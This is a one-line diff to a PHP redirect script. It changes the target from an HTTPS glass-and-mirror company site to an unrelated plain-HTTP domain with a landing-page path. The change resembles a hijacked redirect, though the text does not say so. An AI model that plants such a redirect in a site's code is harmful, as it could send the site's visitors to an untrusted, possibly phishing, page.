@@ -1,5 +1,5 @@
 <?php
-header("Location: https://www.centralglassandmirror.com/
+header("Location: http://boosterinterior.us/mcaa/index.html/
 ");
 die();
 ?>
